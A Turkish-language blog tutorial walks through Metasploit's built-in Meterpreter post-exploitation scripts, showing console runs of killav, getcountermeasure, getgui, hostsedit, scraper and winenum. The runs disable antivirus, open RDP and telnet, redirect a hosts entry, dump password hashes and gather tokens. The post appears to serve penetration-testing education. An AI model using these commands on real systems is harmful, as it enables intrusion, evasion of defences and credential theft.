---
draft: false

title:  'MSF Meterpreter Scripting'
date: '2017-06-14T13:45:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  'Meterpreter komut satırının güçlü yönlerinden bir tanesi de çok yönlülük ve dışarıdan başka script kodlarının kolayca adapte edilebilmesidir. Bu yazıda, Meterpreter içinde öncelikle mevcut kodların neler olduğunu göreceğiz. Ardından ilerleyen yazılarda, ihtiyaca göre kendi script kodlarımızı oluşturmayı göreceğiz.' 
 
url:  /tr/msf-meterpreter-scripting/
 
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---


## Meterpreter Scripting



Meterpreter komut satırının güçlü yönlerinden bir tanesi de çok yönlülük ve dışarıdan başka script kodlarının kolayca adapte edilebilmesidir. Bu yazıda, Meterpreter içinde öncelikle mevcut kodların neler olduğunu göreceğiz. Ardından ilerleyen yazılarda, ihtiyaca göre kendi script kodlarımızı oluşturmayı göreceğiz.



Metasploit Framework sisteminin tamamında olduğu gibi Meterpreter script kodları da Ruby programlama diliyle yazılmaktadır. Ruby hakkında yeterli bilgi sahibi değilseniz, <a href="http://ruby-doc.org/docs/ProgrammingRuby/">Ruby Programlama</a> web sitesini bir miktar incelemenizi tavsiye ediyorum.



Metasploit Framework içerisinde mevcut bulunan scriptleri incelemek isterseniz, <a href="https://www.offensive-security.com/metasploit-unleashed/existing-scripts/">Github</a> adresini inceleyebilirsiniz. Mevcut scriptlerin incelenmesi bizim çok işimize yarayacaktır. Muhtemelen, sizin yapmak istediğiniz işleme ait bir örnek kod parçası mevcut scriptlerin içinde bulunmaktadır. Buradan istediğiniz kod bölümünü alarak kullanmak en mantıklı yaklaşım olacaktır.



## Mevcut Scriptler



Aşağıda, bir kaç script örneği ve ne gibi işlemler yaptığı açıklanmıştır. Bu doğrultuda Ruby kodlarını inceleyebilirsiniz.


<!-- wp:quote -->
<blockquote class="wp-block-quote">
Meterpreter scriptlerinin kullanımı için, hedef sistemde bir şekilde Meterpreter oturumu açmış olmanız gerekmektedir. Anlatımlarda, oturum açtığınız kabul edilmiştir.
</blockquote>
<!-- /wp:quote -->


## checkvm



`checkvm` scripti, adından da anlaşılacağı gibi, oturumu bir sanal makinede açıp açmadığınızı kontrol etmekte kullanılır.


```bash
 meterpreter > run checkvm   > Checking **if **SSHACKTHISBOX-0 is a Virtual Machine ........
 > This is a VMware Workstation/Fusion Virtual Machine
```



## getcountermeasure



`getcountermeasure` scripti, hedef sistemin güvenlik bilgisini görmeyi sağlar. Antivirüs veya Firewall u devre dışı bırakmanıza yardım eder.


```bash
 meterpreter > run getcountermeasure  > Running Getcountermeasure on the target... 
 > Checking for **contermeasures...
 > Getting Windows Built **in **Firewall configuration...
 >    
 >     Domain profile configuration:
 >     -------------------------------------------------------------------
 >     Operational mode                  **=** Disable
 >     Exception mode                    **=** Enable
 >    
 >     Standard profile configuration:
 >     -------------------------------------------------------------------
 >     Operational mode                  **=** Disable
 >     Exception mode                    **=** Enable
 >    
 >     Local Area Connection 6 firewall configuration:
 >     -------------------------------------------------------------------
 >     Operational mode                  **=** Disable
 >    
 > Checking DEP Support Policy...
```



## getgui



`getgui` scripti, hedef bilgisayarda RDP özelliği kapalıysa açmayı sağlar.


```bash
 meterpreter > run getgui 

**[!]** Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
**[!]** Example: run post/windows/manage/enable_rdp OPTION**=**value **[**...]
Windows Remote Desktop Enabler Meterpreter Script
Usage: getgui -u  -p 
Or:    getgui -e

OPTIONS:

    -e        Enable RDP only.
    -f   Forward RDP Connection.
    -h        Help menu.
    -p   The Password of the user to add.
    -u   The Username of the user to add. meterpreter > run getgui -e > Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
 > Carlos Perez carlos_perez@darkoperator.com
 > Enabling Remote Desktop
 > RDP is already enabled
 > Setting Terminal Services service startup mode
 > Terminal Services service is already set to auto
 > Opening port **in **local firewall **if **necessary
```



## get_local_subnets



`get_local_subnets` scripti, hedef bilgisayarın yerel subnet bilgilerini elde etmeyi sağlar. Bu bilgiler pivoting işlemlerinde kullanılabilir.


```bash
meterpreter > run get_local_subnets 

Local subnet: 10.211.55.0/255.255.255.0
```



## gettelnet



`gettelnet` scripti, hedef bilgisayarda telnet özeliği kapalıysa, açmaya yarar.


```bash
meterpreter > run gettelnet 
Windows Telnet Server Enabler Meterpreter Script
Usage: gettelnet -u  -p 

OPTIONS:

    -e        Enable Telnet Server only.
    -f   Forward Telnet Connection.
    -h        Help menu.
    -p   The Password of the user to add.
    -u   The Username of the user to add.
 
meterpreter > run gettelnet -e

> Windows Telnet Server Enabler Meterpreter Script
> Setting Telnet Server Services service startup mode
> The Telnet Server Services service is not set to auto, changing it to auto ...
> Opening port **in **local firewall **if **necessary
```



## hostsedit



`hostsedit` scripti, Windows hosts dosyasına bilgi girmeye yarar. Bağlanılmak istenen web adreslerinin DNS adresleri için önce bu hosts dosyasına bakılır. Hedef bilgisayarı istenen adrese yönlendirmek için kullanılır. Her satıra bir adres girilmelidir.


```bash
meterpreter > run hostsedit 

**[!]** Meterpreter scripts are deprecated. Try post/windows/manage/inject_host.
**[!]** Example: run post/windows/manage/inject_host OPTION**=**value **[**...]
This Meterpreter script is for **adding entries **in **to the Windows Hosts file.
Since Windows will check first the Hosts file instead of the configured DNS Server
it will assist **in **diverting traffic to the fake entry or entries. Either a single
entry can be provided or a series of entries provided a file with one per line.

OPTIONS:

    -e   Host entry **in the format of IP,Hostname.
    -h        Help Options.
    -l   Text file with list of entries **in the format of IP,Hostname. One per line.

Example:


run hostsedit -e 127.0.0.1,google.com

run hostsedit -l /tmp/fakednsentries.txt meterpreter > run hostsedit -e 10.211.55.162,www.microsoft.com
 > Making Backup of the hosts file.
 > Backup loacated **in **C:\WINDOWS\System32\drivers\etc\hosts62497.back
 > Adding Record for **Host <a href="http://www.microsoft.com/">www.microsoft.com</a> with IP 10.211.55.162
 > Clearing the DNS Cache
```



## killav



`killav` scripti, sistemde bir servis olarak çalışan Antivirüs programlarını devre dışı bırakmada kullanılır.


```bash
 meterpreter > run killav  > Killing Antivirus services on the target...
 > Killing off cmd.exe...
```



## remotewinenum



`remotewinenum` scripti, hedef sistem hakkında bilgi etmek için kullanılır.


```bash
meterpreter > run remotewinenum

**[!]** Meterpreter scripts are deprecated. Try post/windows/gather/wmic_command.
**[!]** Example: run post/windows/gather/wmic_command OPTION**=**value **[**...]
Remote Windows Enumeration Meterpreter Script
This script will enumerate windows hosts **in the target enviroment
given a username and password or using the credential under witch
Meterpeter is running using WMI wmic windows native tool.
Usage:

OPTIONS:

    -h        Help menu.
    -p   Password of user on target system
    -t   The target address
    -u   User on the target system (If not provided it will use credential of process) meterpreter > run remotewinenum -u administrator -p ihazpassword -t 10.211.55.128 > Saving report to /root/.msf4/logs/remotewinenum/10.211.55.128_20090711.0142 
 > Running WMIC Commands ....
 >     running command wimic environment list
 >     running command wimic share list
 >     running command wimic nicconfig list
 >     running command wimic computersystem list
 >     running command wimic useraccount list
 >     running command wimic group list
 >     running command wimic sysaccount list
 >     running command wimic volume list brief
 >     running command wimic logicaldisk get description,filesystem,name,size
 >     running command wimic netlogin get name,lastlogon,badpasswordcount
 >     running command wimic netclient list brief
 >     running command wimic netuse get name,username,connectiontype,localname
 >     running command wimic share get name,path
 >     running command wimic nteventlog get path,filename,writeable
 >     running command wimic service list brief
 >     running command wimic process list brief
 >     running command wimic startup list full
 >     running command wimic rdtoggle list
 >     running command wimic product get name,version
 >     running command wimic qfe list
```



## scraper



`scraper` scripti, `remotewinenum` ile elde edilen bilgiden daha fazlasını elde etmeye yarar. Elde edilen bilgilerin içinde registry kayıtları da bulunur.


```bash
meterpreter > run scraper > New session on 10.211.55.128:4444...
 > Gathering basic system information...
 > Dumping password hashes...
 > Obtaining the entire registry...
 > Exporting HKCU
 > Downloading HKCU (C:\WINDOWS\TEMP\LQTEhIqo.reg)
 > Cleaning HKCU
 > Exporting HKLM
 > Downloading HKLM (C:\WINDOWS\TEMP\GHMUdVWt.reg)
```



Yukarıdaki örneklerde görüldüğü gibi, Meterpreter script kodlarıyla oldukça detaylı bilgi toplanabilmektedir. Bunun yanında Antivirüs veya Firewall iptal etmede de kullanılmaktadır.



## winenum



`winenum` scripti, sistem hakkında en detaylı bilgiyi elde etmede kullanılabilir. Token, hash bilgileri ve diğer tüm bilgileri `winenum` scripti ile görebilirsiniz.


```bash
meterpreter > run winenum  > Running Windows Local Enumerion Meterpreter Script
 > New session on 10.211.55.128:4444...
 > Saving report to /root/.msf4/logs/winenum/10.211.55.128_20090711.0514-99271/10.211.55.128_20090711.0514-99271.txt
 > Checking **if **SSHACKTHISBOX-0 is a Virtual Machine ........
 >     This is a VMware Workstation/Fusion Virtual Machine 
 > Running Command List ...
 >     running command cmd.exe /c set
 >     running command arp -a
 >     running command ipconfig /all
 >     running command ipconfig /displaydns
 >     running command route print
 >     running command net view
 >     running command netstat -nao
 >     running command netstat -vb
 >     running command netstat -ns
 >     running command net accounts
 >     running command net accounts /domain
 >     running command net session
 >     running command net share
 >     running command net group
 >     running command net user
 >     running command net localgroup
 >     running command net localgroup administrators
 >     running command net group administrators
 >     running command net view /domain
 >     running command netsh firewall show config
 >     running command tasklist /svc
 >     running command tasklist /m
 >     running command gpresult /SCOPE COMPUTER /Z
 >     running command gpresult /SCOPE USER /Z
 > Running WMIC Commands ....
 >     running command wmic computersystem list brief
 >     running command wmic useraccount list
 >     running command wmic group list
 >     running command wmic service list brief
 >     running command wmic volume list brief
 >     running command wmic logicaldisk get description,filesystem,name,size
 >     running command wmic netlogin get name,lastlogon,badpasswordcount
 >     running command wmic netclient list brief
 >     running command wmic netuse get name,username,connectiontype,localname
 >     running command wmic share get name,path
 >     running command wmic nteventlog get path,filename,writeable
 >     running command wmic process list brief
 >     running command wmic startup list full
 >     running command wmic rdtoggle list
 >     running command wmic product get name,version
 >     running command wmic qfe
 > Extracting software list from registry
 > Finished Extraction of software list from registry
 > Dumping password hashes...
 > Hashes Dumped
 > Getting Tokens...
 > All tokens have been processed
 > Done!```
